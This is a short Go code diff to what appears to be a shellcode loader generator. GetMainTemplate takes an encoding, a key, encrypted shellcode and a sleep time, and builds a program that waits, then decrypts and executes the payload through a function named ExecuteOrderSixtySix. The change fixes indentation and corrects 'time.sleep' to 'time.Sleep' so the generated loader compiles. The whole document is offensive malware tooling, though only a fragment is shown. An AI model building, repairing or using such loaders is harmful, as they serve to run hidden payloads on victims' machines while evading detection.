@@ -128,10 +128,10 @@ go 1.20
 }
 
 func GetMainTemplate(
-    encoding string,
-    key string,
-    sc string,
-    sleepTime uint,
+	encoding string,
+	key string,
+	sc string,
+	sleepTime uint,
 ) string {
 
 	/* if hex encoding is used, it does not require to go through StdEncoding */
@@ -162,7 +162,7 @@ func main() {
         os.Exit(1)
     }
 
-    time.sleep(%d * time.Second)
+    time.Sleep(%d * time.Second)
     ExecuteOrderSixtySix(decrypted)
 }
     `, encoding, key, sc, encCall, encCall, sleepTime)
